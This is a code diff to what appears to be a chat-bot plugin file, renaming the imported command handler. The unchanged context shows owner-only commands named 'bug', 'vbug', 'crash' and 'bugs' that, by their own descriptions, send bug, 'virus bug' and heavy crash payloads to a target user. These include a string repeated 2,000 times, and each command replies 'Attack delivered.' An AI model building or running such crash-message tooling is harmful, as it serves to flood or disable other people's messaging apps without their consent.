@@ -1,4 +1,4 @@
-const { bwmxmd } = require('../core/commandHandler');
+const { kiubyxmd } = require('../core/commandHandler');
 
 // Payloads for various bug/crash commands (Simplified representations)
 const payloads = {
@@ -9,7 +9,7 @@ const payloads = {
     sbug: "S_Y_S_T_E_M_P_A_Y_L_O_A_D_".repeat(2000)
 };
 
-bwmxmd({
+kiubyxmd({
     pattern: "bug",
     category: "owner",
     description: "Send a standard bug payload to target",
@@ -26,7 +26,7 @@ bwmxmd({
     reply("✅ Attack delivered.");
 });
 
-bwmxmd({
+kiubyxmd({
     pattern: "vbug",
     category: "owner",
     description: "Send a virus bug payload to target",
@@ -43,7 +43,7 @@ bwmxmd({
     reply("✅ Attack delivered.");
 });
 
-bwmxmd({
+kiubyxmd({
     pattern: "crash",
     category: "owner",
     description: "Send a heavy crash payload to target",
@@ -66,7 +66,7 @@ bwmxmd({
     reply("✅ Heavy payload delivered.");
 });
 
-bwmxmd({
+kiubyxmd({
     pattern: "bugs",
     aliases: ["bugmenu", "attack"],
     category: "owner",
